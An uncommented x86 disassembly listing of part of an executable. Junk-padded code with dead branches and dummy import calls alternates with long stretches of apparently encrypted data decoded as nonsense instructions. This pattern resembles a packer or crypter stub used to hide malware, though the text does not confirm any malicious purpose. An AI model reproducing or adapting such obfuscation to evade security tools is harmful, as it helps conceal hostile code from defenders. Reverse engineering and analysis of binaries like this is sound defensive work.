  40184c:	xchg   ebp,eax
  40184d:	add    ah,BYTE PTR [eax-0x130c5853]
  401853:	icebp  
  401854:	jmp    0x40183e
  401856:	cld    
  401857:	inc    eax
  401858:	jo     0x401812
  40185a:	(bad)  
  40185b:	fcom   QWORD PTR [esi-0x5]
  40185e:	lahf   
  40185f:	jae    0x4018b7
  401861:	push   edi
  401862:	repnz icebp 
  401864:	sti    
  401865:	rcl    DWORD PTR [ebx+eiz*4+0x4],cl
  401869:	fldcw  WORD PTR [ecx]
  40186b:	inc    ebx
  40186c:	mov    DWORD PTR [eax-0xc],esi
  40186f:	cmc    
  401870:	div    BYTE PTR [edx-0x5b]
  401873:	inc    ebx
  401874:	out    dx,eax
  401875:	sbb    esi,DWORD PTR [eax]
  401877:	sub    al,0x1c
  401879:	lock aam 0x7d
  40187c:	leave  
  40187d:	push   cs
  40187e:	repz js 0x401802
  401881:	imul   BYTE PTR [edx]
  401883:	lds    esp,FWORD PTR [edi-0x1a]
  401886:	fiadd  WORD PTR [ebx+0x15]
  401889:	aaa    
  40188a:	xor    eax,0x3ad32d6e
  40188f:	leave  
  401890:	cwde   
  401891:	sbb    DWORD PTR [esi-0xc626450],ebx
  401897:	inc    ecx
  401898:	dec    ebx
  401899:	pop    ebx
  40189a:	popf   
  40189b:	lahf   
  40189c:	pop    esp
  40189d:	push   edi
  40189e:	aaa    
  40189f:	minps  xmm4,XMMWORD PTR [edx+ebx*8+0x12]
  4018a4:	bound  ebx,QWORD PTR [ebx-0xe56026e]
  4018aa:	mov    eax,ds:0x59fe70fd
  4018af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018b0:	inc    edi
  4018b1:	sbb    eax,0x33a86b9b
  4018b6:	adc    edi,DWORD PTR [ecx+0x35e6cba6]
  4018bc:	jbe    0x40184d
  4018be:	cmp    ecx,eax
  4018c0:	push   0x36
  4018c2:	stos   DWORD PTR es:[edi],eax
  4018c3:	xchg   edi,eax
  4018c5:	stc    
  4018c6:	xor    eax,0xe8530bc7
  4018cb:	jnp    0x401912
  4018cd:	mov    bl,0x66
  4018cf:	je     0x40188b
  4018d1:	mov    edi,0xb2d966cb
  4018d6:	and    BYTE PTR [ebp+0x32],dh
  4018d9:	pop    ecx
  4018da:	int3   
  4018db:	push   ss
  4018dc:	imul   edx,DWORD PTR [edi],0xffffffe4
  4018df:	adc    eax,0x3cb6d3bd
  4018e4:	(bad)  
  4018e5:	mov    bh,al
  4018e7:	adc    DWORD PTR [ecx],esi
  4018e9:	or     eax,0xa473b6f7
  4018ee:	popa   
  4018ef:	lahf   
  4018f0:	and    BYTE PTR [ebx],dh
  4018f2:	fisttp QWORD PTR [eax+0x7cd7c149]
  4018f8:	mov    dl,0x54
  4018fa:	mov    dl,0xc
  4018fc:	xchg   ebp,eax
  4018fd:	sbb    DWORD PTR [eax-0x64],0xffffffca
  401901:	iret   
  401902:	sar    DWORD PTR [ebx],cl
  401904:	push   eax
  401905:	popa   
  401906:	sub    eax,DWORD PTR [ebp-0x2e]
  401909:	mov    cl,0xb
  40190b:	mov    ecx,0x87f85905
  401910:	loope  0x401942
  401912:	mov    edx,0x6bc9d070
  401917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401918:	cdq    
  401919:	and    DWORD PTR [ecx-0x6f],ecx
  40191c:	xor    ebx,DWORD PTR [ecx+ecx*4]
  40191f:	push   edx
  401920:	das    
  401921:	stos   DWORD PTR es:[edi],eax
  401922:	or     DWORD PTR [edi+0x3f],ebp
  401925:	idiv   ecx
  401927:	cmc    
  401928:	into   
  401929:	fld    TBYTE PTR [ebp+0x27]
  40192c:	cld    
  40192d:	mov    ?,ecx
  40192f:	outs   dx,BYTE PTR ds:[esi]
  401930:	sub    DWORD PTR [edi],edi
  401932:	pusha  
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428257,0x0
  401946:	not    DWORD PTR ds:0x4282cf
  40194c:	mov    edi,DWORD PTR ds:0x428173
  401952:	mov    DWORD PTR ds:0x42826f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282db,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428257,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d5c
  401981:	mov    edx,DWORD PTR ds:0x428377
  401987:	adc    DWORD PTR ds:0x4282df,edx
  40198d:	and    edx,DWORD PTR ds:0x42822f
  401993:	add    DWORD PTR ds:0x42825f,edx
  401999:	mov    edi,DWORD PTR ds:0x428153
  40199f:	xor    DWORD PTR ds:0x42817b,edi
  4019a5:	and    DWORD PTR ds:0x42814b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42835b
  4019b4:	sub    ecx,DWORD PTR ds:0x42825b
  4019ba:	mov    DWORD PTR ds:0x42835b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42836b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428363,0x339b
  4019e6:	mov    eax,ds:0x4223b0
  4019eb:	cmp    DWORD PTR ds:0x428247,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428257
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428247,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428267
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e48
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428167
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428157
  401a44:	sub    DWORD PTR ds:0x4282e3,ecx
  401a4a:	add    DWORD PTR ds:0x428163,0x42825b
  401a54:	xor    edx,DWORD PTR ds:0x4282cb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428173,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428173,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428247
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x4282ff,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42824b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428173,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d60
  401ac0:	sub    edx,DWORD PTR ds:0x428383
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42836f
  401ad4:	adc    ecx,DWORD PTR ds:0x42815f
  401ada:	mov    DWORD PTR ds:0x42836f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42815b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428143,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428257,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42816f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42814f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428143,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428eb0
  401b3a:	movzx  edx,WORD PTR ds:0x42827f
  401b41:	and    edx,DWORD PTR ds:0x42815b
  401b47:	mov    DWORD PTR ds:0x42827f,edx
  401b4d:	and    DWORD PTR ds:0x428237,edx
  401b53:	add    DWORD PTR ds:0x42837b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428283
  401b5f:	add    DWORD PTR ds:0x42823b,edi
  401b65:	or     edx,DWORD PTR ds:0x428367
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282eb,0x0
  401b78:	mov    DWORD PTR ds:0x428283,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428153,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428227
  401ba1:	cmp    DWORD PTR ds:0x4282eb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d74
  401bc7:	sub    DWORD PTR ds:0x4282d7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42823b
  401bd4:	add    DWORD PTR ds:0x4282e7,edx
  401bda:	add    DWORD PTR ds:0x42813f,ebx
  401be0:	sbb    DWORD PTR ds:0x42820f,edi
  401be6:	inc    DWORD PTR ds:0x42820f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428373,0x428217
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0x3ab0afeb
  401c11:	ins    DWORD PTR es:[edi],dx
  401c12:	in     eax,0xaa
  401c14:	and    eax,0x9e18180a
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    al,bh
  401c1d:	mov    ?,WORD PTR [ebx]
  401c1f:	sub    DWORD PTR [ebp-0x392df9aa],eax
  401c25:	je     0x401c38
  401c27:	(bad)  
  401c28:	sbb    eax,0xa28e91f9
  401c2d:	out    0x1e,al
  401c2f:	repz push ecx
  401c31:	xor    BYTE PTR [edx],ah
  401c33:	nop
  401c34:	pop    ecx
  401c35:	imul   esp,DWORD PTR [esi+0x6ceb60],0xf317dc78
  401c3f:	pop    es
  401c40:	ja     0x401c66
  401c42:	adc    al,0xdd
  401c44:	std    
  401c45:	sub    BYTE PTR [eax],cl
  401c47:	push   es
  401c48:	push   ss
  401c49:	lea    eax,[ecx-0x70151db1]
  401c4f:	xchg   esp,eax
  401c50:	mov    esi,0xbe93b57b
  401c55:	stos   BYTE PTR es:[edi],al
  401c56:	xor    al,al
  401c58:	(bad)  
  401c59:	rcl    DWORD PTR [ebx+0x60f8758],0x93
  401c60:	sbb    DWORD PTR [edx+0x47cd2a94],esi
  401c66:	mov    ds:0x3be77760,eax
  401c6b:	in     eax,0xd9
  401c6d:	fwait
  401c6e:	sub    BYTE PTR [edi+0x44],ch
  401c71:	leave  
  401c72:	(bad)  
  401c74:	fcom   st(4)
  401c76:	hlt    
  401c77:	scas   al,BYTE PTR es:[edi]
  401c78:	and    dl,cl
  401c7a:	lods   al,BYTE PTR ds:[esi]
  401c7b:	push   ebp
  401c7c:	mov    fs,WORD PTR ds:0x8a294b8c
  401c82:	sbb    eax,0xd56eb400
  401c87:	mov    esp,0x5b532983
  401c8c:	nop
  401c8d:	icebp  
  401c8e:	or     al,dh
  401c90:	shr    DWORD PTR [edi-0xf],0x34
  401c94:	pop    eax
  401c95:	popf   
  401c96:	mov    DWORD PTR [edx],ebp
  401c98:	cdq    
  401c99:	mov    ebp,0xccad1f06
  401c9e:	cld    
  401c9f:	jge    0x401c4c
  401ca1:	or     eax,0x5576ca9c
  401ca6:	ror    DWORD PTR [ecx-0x9ba00fd],cl
  401cac:	xor    edx,edi
  401cae:	ret    0xe379
  401cb1:	xor    DWORD PTR [eax+0x63],ebp
  401cb4:	in     al,dx
  401cb5:	out    dx,al
  401cb6:	pusha  
  401cb7:	call   0x351fbc92
  401cbc:	jo     0x401d0b
  401cbe:	sti    
  401cbf:	sub    esp,DWORD PTR [ebx]
  401cc1:	into   
  401cc2:	rcl    esp,cl
  401cc4:	dec    ebp
  401cc5:	add    dh,BYTE PTR [ecx]
  401cc7:	(bad)  
  401cc8:	jbe    0x401c4f
  401cca:	std    
  401ccb:	call   0x7db41b5f
  401cd0:	mov    ebp,0xfdd60bec
  401cd5:	scas   al,BYTE PTR es:[edi]
  401cd6:	test   al,0x5b
  401cd8:	push   es
  401cd9:	pop    eax
  401cda:	mov    bl,dh
  401cdc:	and    ecx,DWORD PTR [ebp+eiz*1+0x57]
  401ce0:	push   ds
  401ce1:	out    dx,eax
  401ce2:	cdq    
  401ce3:	cmp    ah,BYTE PTR [edi+0x51]
  401ce6:	outs   dx,BYTE PTR ds:[esi]
  401ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce8:	or     ebx,ebp
  401cea:	jno    0x401d35
  401cec:	add    esp,DWORD PTR [edx+0x74]
  401cef:	mov    bh,0xe
  401cf1:	aad    0xbe
  401cf3:	fdivr  DWORD PTR [edx+0x53]
  401cf6:	or     eax,0x719276f3
  401cfb:	push   edi
  401cfc:	adc    DWORD PTR [esi+0x1e0a2baa],edx
  401d02:	call   0x4c5a11fb
  401d07:	push   ebp
  401d08:	mov    ch,0x97
  401d0a:	add    BYTE PTR [edi-0x2631b226],bl
  401d10:	push   ecx
  401d11:	mov    ch,BYTE PTR [eax+eax*1-0x5d]
  401d15:	xchg   ebx,eax
  401d16:	ret    0xee4e
  401d19:	(bad)  
  401d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1b:	scas   eax,DWORD PTR es:[edi]
  401d1c:	xchg   edi,eax
  401d1d:	sahf   
  401d1e:	dec    ecx
  401d1f:	or     eax,0xfa06b875
  401d24:	pop    ecx
  401d25:	sbb    BYTE PTR [eax],al
  401d27:	xor    al,0x4d
  401d29:	shl    DWORD PTR [esi-0x29],cl
  401d2c:	dec    edx
  401d2d:	jae    0x401d51
  401d2f:	aas    
  401d30:	rcr    DWORD PTR [edx-0x31],cl
  401d33:	out    dx,al
  401d34:	sar    cl,cl
  401d36:	cmc    
  401d37:	cwde   
  401d38:	xchg   BYTE PTR [esp+edi*4],bl
  401d3b:	jle    0x401cdb
  401d3d:	aaa    
  401d3e:	pop    ebx
  401d3f:	mov    eax,ds:0x4b631aa8
  401d44:	addr16 mov ebp,0xfe46ae3
  401d4a:	lahf   
  401d4b:	adc    eax,0xafe6209f
  401d50:	sub    eax,0xa8a6c820
  401d55:	adc    DWORD PTR [edx],esi
  401d57:	lods   al,BYTE PTR ds:[esi]
  401d58:	jbe    0x401d99
  401d5a:	mov    bl,0xf
  401d5c:	inc    edx
  401d5d:	ret    
  401d5e:	test   DWORD PTR [edi+0x72],esi
  401d61:	mov    eax,ds:0xaf6a52ac
  401d66:	stc    
  401d67:	sahf   
  401d68:	leave  
  401d69:	stos   BYTE PTR es:[edi],al
  401d6a:	sbb    al,0xed
  401d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d6d:	push   edx
  401d6e:	push   edx
  401d6f:	scas   al,BYTE PTR es:[edi]
  401d70:	dec    ebp
  401d71:	fisttp DWORD PTR [esi+0x71]
  401d74:	lds    ebp,FWORD PTR [ebx]
  401d76:	pop    edx
  401d77:	mov    BYTE PTR [ebp+0x499e142e],dh
  401d7d:	inc    esi
  401d7e:	loopne 0x401dc2
  401d80:	push   edx
  401d81:	sub    eax,0xede74f8b
  401d86:	mov    ebp,0x45303315
  401d8b:	pop    ecx
  401d8c:	out    dx,al
  401d8d:	mov    esp,0xa28b9680
  401d92:	aas    
  401d93:	nop
  401d94:	cmp    DWORD PTR [edx],edx
  401d96:	popf   
  401d97:	in     al,dx
  401d98:	enter  0xea49,0x36
  401d9c:	dec    edi
  401d9d:	mov    edi,esp
  401d9f:	std    
  401da0:	(bad)  
  401da1:	enter  0x7f4f,0x13
  401da5:	mov    ah,0xea
  401da7:	mov    ?,edx
  401da9:	inc    esp
  401daa:	push   ss
  401dab:	cmc    
  401dac:	cmp    DWORD PTR [ebx+0x2f7d40b8],edx
  401db2:	retf   0xf8b8
  401db5:	(bad)  
  401db7:	push   edx
  401db8:	(bad)  
  401db9:	push   esi
  401dba:	push   edx
  401dbb:	jle    0x401dba
  401dbd:	inc    esi
  401dbe:	adc    BYTE PTR [edi+0x73],bl
  401dc1:	lds    esp,FWORD PTR [ecx-0x7bba83de]
  401dc7:	sbb    BYTE PTR [edx+eiz*4+0x549dfda0],bl
  401dce:	jmp    0x59d7f00f
  401dd3:	ret    
  401dd4:	mov    dh,0x88
  401dd6:	inc    edx
  401dd7:	jb     0x401e3b
  401dd9:	jg     0x401dbd
  401ddb:	neg    DWORD PTR [esp+eiz*4+0x4b]
  401ddf:	lahf   
  401de0:	stc    
  401de1:	sbb    BYTE PTR [ebx],bl
  401de3:	or     eax,0x135a3b28
  401de8:	in     eax,dx
  401de9:	das    
  401dea:	pop    es
  401deb:	test   BYTE PTR [eax+0x3e25c64],ah
  401df1:	pop    esp
  401df2:	test   dh,al
  401df4:	mul    BYTE PTR [esi]
  401df6:	push   edx
  401df7:	clc    
  401df8:	sub    dh,BYTE PTR [esi]
  401dfa:	mov    ch,0xae
  401dfc:	sub    eax,0x37defb66
  401e01:	xor    DWORD PTR [ebx+0x6c],ebp
  401e04:	or     esi,DWORD PTR [edi]
  401e06:	cmp    BYTE PTR [edx+0x1254d87d],dl
  401e0c:	cmp    DWORD PTR [edx+0x4de4208b],0xe5fc3ac6
  401e16:	and    DWORD PTR [esi],ebp
  401e18:	leave  
  401e19:	cmp    eax,0x814f763d
  401e1e:	jo     0x401e96
  401e20:	shr    BYTE PTR ss:[esi],cl
  401e23:	fild   DWORD PTR [esi]
  401e25:	adc    ebp,0x6e
  401e28:	arpl   WORD PTR [ecx+0x5b],di
  401e2b:	xchg   BYTE PTR [edi],al
  401e2d:	add    esp,0x30
  401e30:	fs xor bl,ah
  401e33:	aas    
  401e34:	(bad)  
  401e35:	and    DWORD PTR [ecx-0x33],esp
  401e38:	jl     0x401df5
  401e3a:	lea    edx,[edx]
  401e3c:	mov    ds:0xdcc41b67,eax
  401e41:	fimul  WORD PTR [edi]
  401e43:	and    eax,0xb3271ab4
  401e48:	xchg   esi,eax
  401e49:	add    ah,bl
  401e4b:	les    ebp,FWORD PTR [ecx]
  401e4d:	(bad)  
  401e4e:	jmp    FWORD PTR [esi+edx*2]
  401e51:	inc    esi
  401e52:	cmp    eax,0x45d7f6e3
  401e57:	sub    edi,DWORD PTR [esp+edx*8-0x4fd10429]
  401e5e:	add    bh,dl
  401e60:	xor    ch,BYTE PTR [ebx+edx*8-0x3e]
  401e64:	pop    ebx
  401e65:	outs   dx,DWORD PTR ds:[esi]
  401e66:	imul   edx,DWORD PTR [esi+0x37],0xc89f38b2
  401e6d:	cmp    DWORD PTR [eax],0x25
  401e70:	xor    BYTE PTR ds:0xd4db0474,bh
  401e76:	dec    ecx
  401e77:	push   ebx
  401e78:	mov    esi,DWORD PTR [eax]
  401e7a:	and    DWORD PTR [esi],esp
  401e7c:	arpl   WORD PTR [edi],cx
  401e7e:	cs mov edx,0xa7f4247e
  401e84:	cli    
  401e85:	or     ebx,eax
  401e87:	xor    BYTE PTR [edi+0x8],ah
  401e8a:	jbe    0x401ef4
  401e8c:	bound  eax,QWORD PTR [eax-0xc626cb1]
  401e92:	adc    eax,DWORD PTR [edx-0x363d4c4e]
  401e98:	out    0x4,eax
  401e9a:	(bad)  
  401e9c:	jecxz  0x401e45
  401e9e:	mov    ecx,0x8420f1e2
  401ea3:	add    bl,dl
  401ea5:	das    
  401ea6:	cli    
  401ea7:	push   ebp
  401ea8:	add    al,0xd8
  401eaa:	push   edi
  401eab:	(bad)  
  401eac:	mov    edx,0x308ae30a
  401eb1:	adc    al,0xa1
  401eb3:	mov    bh,0x6f
  401eb5:	sbb    esi,DWORD PTR [ebx]
  401eb7:	dec    ebp
  401eb8:	lock outs dx,BYTE PTR ds:[esi]
  401eba:	fs retf 
  401ebc:	daa    
  401ebd:	ret    0xbfd5
  401ec0:	and    DWORD PTR [edi],ebx
  401ec2:	push   esp
  401ec3:	mov    ds:0xe59d20a1,al
  401ec8:	in     al,dx
  401ec9:	test   eax,0x2c13f87d
  401ece:	pop    ecx
  401ecf:	pop    ss
  401ed0:	leave  
  401ed1:	(bad)  [esi+eax*1]
  401ed4:	lods   al,BYTE PTR ds:[esi]
  401ed5:	sbb    DWORD PTR [ebx],0x3e7fedfb
  401edb:	ins    DWORD PTR es:[edi],dx
  401edc:	aam    0x6c
  401ede:	adc    ch,bl
  401ee0:	leave  
  401ee1:	int    0x22
  401ee3:	mov    al,0x8
  401ee5:	call   0x6ef00d54
  401eea:	mov    dl,0xd1
  401eec:	pop    ebp
  401eed:	add    al,0x3
  401eef:	push   edx
  401ef0:	jmp    0x401eb7
  401ef2:	xchg   esp,eax
  401ef3:	xlat   BYTE PTR ds:[ebx]
  401ef4:	sub    ebp,DWORD PTR [eax+0x47]
  401ef7:	retf   
  401ef8:	dec    ecx
  401ef9:	dec    ebx
  401efa:	out    dx,al
  401efb:	stc    
  401efc:	pop    esp
  401efd:	div    bh
  401eff:	xor    al,0x55
  401f01:	xor    bl,BYTE PTR [eax-0x6c]
  401f04:	mov    esi,0x94bb2586
  401f09:	pop    esp
  401f0a:	push   esp
  401f0b:	sub    eax,0x52fcfeb8
  401f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f11:	push   0x32dbd73e
  401f16:	jl     0x401f42
  401f18:	dec    ecx
  401f19:	enter  0x696b,0xb
  401f1d:	cwde   
  401f1e:	sbb    dh,BYTE PTR [esi]
  401f20:	xor    ebx,ebp
  401f22:	xchg   ecx,eax
  401f23:	mov    bl,0xf5
  401f25:	mov    ah,0x3e
  401f27:	iret   
  401f28:	mov    dl,BYTE PTR [ebp+ebx*8-0x78]
  401f2c:	adc    bh,BYTE PTR [edi+0x38]
  401f2f:	pop    esp
  401f30:	aas    
  401f31:	outs   dx,DWORD PTR ds:[esi]
  401f32:	inc    esi
  401f33:	test   ecx,edx
  401f35:	pop    edi
  401f36:	fisttp DWORD PTR [ebp+0x55]
  401f39:	pop    esi
  401f3a:	adc    eax,0xbe5c3f6
  401f3f:	clc    
  401f40:	and    al,0x7f
  401f42:	ins    DWORD PTR es:[edi],dx
  401f43:	dec    esp
  401f44:	add    eax,0xcab6449b
  401f49:	or     esi,DWORD PTR [ebx]
  401f4b:	mov    ah,0xad
  401f4d:	xchg   ecx,eax
  401f4e:	sbb    eax,0x120294ec
  401f53:	scas   al,BYTE PTR es:[edi]
  401f54:	dec    esp
  401f55:	div    BYTE PTR [esi+0x62]
  401f58:	adc    edi,DWORD PTR [edx+0xa9e3610]
  401f5e:	add    BYTE PTR [esi],cl
  401f60:	jge    0x401fdc
  401f62:	fld    QWORD PTR [eax]
  401f64:	sar    BYTE PTR [ebp-0x52f05e5c],0x43
  401f6b:	imul   edi,DWORD PTR [edx+eiz*2-0x2583430],0x90440a11
  401f76:	pushf  
  401f77:	cmp    ch,cl
  401f79:	inc    ebx
  401f7a:	mov    edx,DWORD PTR [ebp-0x48e05a5b]
  401f80:	mov    edi,ebx
  401f82:	push   esi
  401f83:	stos   BYTE PTR es:[edi],al
  401f84:	jo     0x401f65
  401f86:	sub    BYTE PTR [ebx],0xa0
  401f89:	or     BYTE PTR [ebx+0x4e],ah
  401f8c:	shl    esi,cl
  401f8e:	nop
  401f8f:	jnp    0x402004
  401f91:	mov    ecx,0x8a7b9fcd
  401f96:	pop    ds
  401f97:	ret    
  401f98:	call   0x8a725140
  401f9d:	adc    bl,ah
  401f9f:	fisttp WORD PTR [edx-0x1f]
  401fa2:	xchg   edx,eax
  401fa3:	dec    edx
  401fa4:	jnp    0x401fad
  401fa6:	inc    ebp
  401fa7:	pop    edi
  401fa8:	push   ss
  401fa9:	adc    eax,0xb1aceea7
  401fae:	mov    esi,0x4cb34b17
  401fb3:	fild   DWORD PTR [eax-0x72]
  401fb6:	and    al,BYTE PTR [edi]
  401fb8:	lds    edx,FWORD PTR [eax-0x7c597e35]
  401fbe:	mov    cl,0xa4
  401fc0:	and    eax,0x811d2567
  401fc5:	jle    0x401f7a
  401fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc8:	pop    ecx
  401fc9:	inc    ebp
  401fca:	in     eax,dx
  401fcb:	dec    eax
  401fcc:	fldenv [esi+0x301d2e05]
  401fd2:	or     al,0xd9
  401fd4:	cmp    BYTE PTR [ebx+0x79666712],ch
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	icebp  
  401fdc:	push   ebp
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42834b
  401fec:	adc    DWORD PTR ds:0x428387,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42836b,0x0
  402000:	mov    DWORD PTR ds:0x42826b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428353,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42836b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d78
  40203e:	or     DWORD PTR ds:0x42814f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282eb,0x4282df
  402052:	add    DWORD PTR ds:0x42826b,0x428307
  40205c:	and    DWORD PTR ds:0x42837b,edi
  402062:	mov    DWORD PTR ds:0x42825b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42817b,0x42813b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282cf,0x0
  402084:	mov    DWORD PTR ds:0x4282cb,ecx
  40208a:	mov    DWORD PTR ds:0x428177,0x59f
  402094:	mov    DWORD PTR ds:0x428177,ecx
  40209a:	mov    DWORD PTR ds:0x4282f7,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282cf,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42814b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428eb4
  4020ce:	sbb    DWORD PTR ds:0x42835b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282db,0x42824f
  4020e2:	adc    DWORD PTR ds:0x42834f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42834f,0x42837f
  4020f6:	and    DWORD PTR ds:0x428137,0x428353
  402100:	sbb    DWORD PTR ds:0x42813b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282cf,0x42827f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282cb
  40213c:	add    DWORD PTR ds:0x428267,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42835b
  40214e:	add    DWORD PTR ds:0x4282f7,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428147,0x0
  402162:	mov    DWORD PTR ds:0x42836b,0x750f
  40216c:	not    DWORD PTR ds:0x428353
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42824b,0x610f
  402181:	mov    eax,ds:0x42815f
  402186:	cmp    DWORD PTR ds:0x428147,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428049
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e50
  4021b1:	adc    DWORD PTR ds:0x42826f,0x428243
  4021bb:	add    DWORD PTR ds:0x42822f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282d3,0x428173
  4021cf:	or     DWORD PTR ds:0x428373,0xa53
  4021d9:	mov    eax,ds:0x428227
  4021de:	xor    DWORD PTR ds:0x42813b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
